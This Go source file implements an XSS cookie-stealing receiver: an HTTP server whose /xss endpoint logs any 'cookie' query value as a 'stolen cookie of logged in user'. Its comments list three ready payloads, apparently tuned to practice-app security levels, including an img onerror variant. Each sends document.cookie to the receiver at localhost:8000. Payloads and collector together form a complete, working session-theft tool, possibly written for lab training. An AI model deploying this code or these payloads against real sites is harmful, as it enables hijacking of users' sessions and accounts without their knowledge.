package xss

import (
	"fmt"
	"net/http"
)

// LOW: <script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>
// MEDIUM: <SCRIPT>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</SCRIPT>
// HIGH: <img src="" onerror='var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();'/>

func Run(port int) error {
	receiver := NewXSSReceiver()
	return receiver.StartServer(port)
}

type XSSReceiver struct {
}

func NewXSSReceiver() *XSSReceiver {
	return &XSSReceiver{}
}

func (r *XSSReceiver) StartServer(port int) error {
	http.HandleFunc("/xss", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")

		cookie := r.URL.Query().Get("cookie")
		if cookie == "" {
			fmt.Println("XSS query string does not contain cookie")
			w.WriteHeader(http.StatusNoContent)
			return
		}

		fmt.Printf("Stolen cookie of logged in user: %s\n", cookie)
		w.WriteHeader(http.StatusNoContent)
	})

	return http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
